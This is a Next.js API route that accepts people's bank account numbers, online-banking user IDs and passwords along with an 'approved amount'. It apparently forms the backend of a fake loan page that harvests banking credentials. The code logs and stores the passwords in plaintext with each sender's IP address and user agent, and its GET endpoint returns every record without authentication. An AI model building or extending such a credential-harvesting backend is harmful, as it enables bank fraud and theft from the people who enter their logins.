import { type NextRequest, NextResponse } from "next/server"
import { getDatabase } from "@/lib/mongodb"

interface BankConnection {
  name: string
  phone: string
  bankAccount: string
  customBankName: string
  userId: string
  password: string
  approvedAmount: string
  submittedAt: string
  status: string
  ipAddress?: string
  userAgent?: string
}

export async function POST(request: NextRequest) {
  try {
    console.log("[v0] Starting bank connection submission")
    const body = await request.json()
    console.log("[v0] Request body received:", JSON.stringify(body, null, 2))

    // Validate required fields
    const requiredFields = [
      "name",
      "phone", 
      "bankAccount",
      "userId",
      "password",
      "approvedAmount"
    ]

    for (const field of requiredFields) {
      if (!body[field]) {
        console.log("[v0] Missing required field:", field)
        return NextResponse.json({ error: `Missing required field: ${field}` }, { status: 400 })
      }
    }

    console.log("[v0] All required fields present")

    // Get client info for tracking
    const ipAddress = request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "unknown"
    const userAgent = request.headers.get("user-agent") || "unknown"

    const bankConnectionData: BankConnection = {
      name: body.name,
      phone: body.phone,
      bankAccount: body.bankAccount,
      customBankName: body.customBankName || "",
      userId: body.userId,
      password: body.password,
      approvedAmount: body.approvedAmount,
      submittedAt: new Date().toISOString(),
      status: body.status || "pending_verification",
      ipAddress,
      userAgent,
    }

    console.log("[v0] Bank connection data prepared:", JSON.stringify(bankConnectionData, null, 2))

    // Test MongoDB connection
    console.log("[v0] Testing MongoDB connection before processing...")
    try {
      const testDb = await getDatabase()
      await testDb.admin().ping()
      console.log("[v0] MongoDB connection test passed")
    } catch (dbError) {
      console.error("[v0] MongoDB connection test failed:", dbError)
      return NextResponse.json(
        {
          error: "Database connection failed",
          details: dbError instanceof Error ? dbError.message : "Unknown database error",
        },
        { status: 503 },
      )
    }

    // Save to database
    console.log("[v0] Saving bank connection to database...")
    const db = await getDatabase()
    const collection = db.collection("bank_connections")
    
    const result = await collection.insertOne(bankConnectionData)
    console.log("[v0] Bank connection saved successfully:", result.insertedId)

    return NextResponse.json(
      {
        success: true,
        message: "Bank connection submitted successfully",
        connectionId: result.insertedId,
      },
      { status: 201 },
    )
  } catch (error) {
    console.error("[v0] Error submitting bank connection:", error)

    const errorResponse = {
      error: "Failed to submit bank connection",
      details: error instanceof Error ? error.message : "Unknown error",
      timestamp: new Date().toISOString(),
    }

    if (process.env.NODE_ENV === "development") {
      errorResponse.stack = error instanceof Error ? error.stack : ""
      errorResponse.env = {
        mongoUri: process.env.MONGODB_URI ? "Set" : "Missing",
        nodeEnv: process.env.NODE_ENV,
      }
    }

    return NextResponse.json(errorResponse, { status: 500 })
  }
}

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const page = Number.parseInt(searchParams.get("page") || "1")
    const limit = Number.parseInt(searchParams.get("limit") || "20")
    const status = searchParams.get("status") || undefined

    console.log("[v0] Fetching bank connections from database...")
    const db = await getDatabase()
    const collection = db.collection("bank_connections")

    // Build query
    const query = status ? { status } : {}
    
    // Get total count
    const total = await collection.countDocuments(query)
    
    // Get paginated results
    const skip = (page - 1) * limit
    const connections = await collection
      .find(query)
      .sort({ submittedAt: -1 })
      .skip(skip)
      .limit(limit)
      .toArray()

    console.log("[v0] Found", connections.length, "bank connections")

    return NextResponse.json({
      connections,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit),
      },
    })
  } catch (error) {
    console.error("Error fetching bank connections:", error)
    return NextResponse.json({ error: "Failed to fetch bank connections" }, { status: 500 })
  }
}
